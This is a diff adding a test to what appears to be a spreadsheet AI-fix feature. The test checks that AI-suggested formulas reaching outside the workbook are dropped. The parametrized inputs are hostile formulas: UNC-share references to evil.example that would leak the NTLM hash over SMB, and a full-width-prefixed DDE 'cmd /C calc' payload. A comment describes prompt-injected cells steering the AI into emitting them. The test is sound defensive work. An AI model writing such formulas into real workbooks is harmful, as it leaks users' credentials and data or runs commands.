@@ -188,6 +188,23 @@ def test_suggest_fix_drops_formulas_that_reach_outside_the_workbook(monkeypatch)
     assert "reached outside this workbook" in out["explanation"]
 
 
+@pytest.mark.parametrize("formula", ["='\\\\evil.example\\s\\b.xlsx'!x", "=SUM('\\\\evil.example\\s\\b.xlsx'!x)",
+                                     "='C:\\Users\\Public\\b.xlsx'!Total", "＝cmd|' /C calc'!A0", "=b.xlsx!Total"])
+def test_an_ai_formula_that_reaches_another_workbook_by_path_or_share_is_left_out(monkeypatch, formula):
+    # AH-140 audit: with no [brackets] a workbook's path or share passed OUTSIDE, and a full-width lead skipped it.
+    # Accepted, the card types a live formula and Excel fetches \\host\share over SMB (the NTLM hash, data in the path)
+    wide = COLS + ["D", "E"]
+    answer = {"explanation": "x", "changes": [{"cell": "D3", "new": formula}, {"cell": "E3", "new": "=B3*C3"},
+                                              {"cell": "D2", "new": "=SUM(C2:C3)"}]}
+    srv, _ = stub_api(monkeypatch, [{"type": "text", "text": json.dumps(answer)}])
+    try:
+        out = client.suggest_fix(wide, [r + ["", ""] for r in ROWS], 1, 0, 0, "", "fill D")
+    finally:
+        srv.shutdown()
+    assert [c["cell"] for c in out["changes"]] == ["E3", "D2"]  # an ordinary formula is still kept
+    assert "(Left out D3: the formula reached outside this workbook.)" in out["explanation"]
+
+
 def test_an_ai_formula_using_a_function_not_on_the_safe_list_is_left_out(monkeypatch):
     # 2026-10-15 audit: the old blocklist let these through. Each one can send the sheet's data out, or read
     # another workbook, after a prompt-injected cell talks the AI into it (the user still sees a preview).
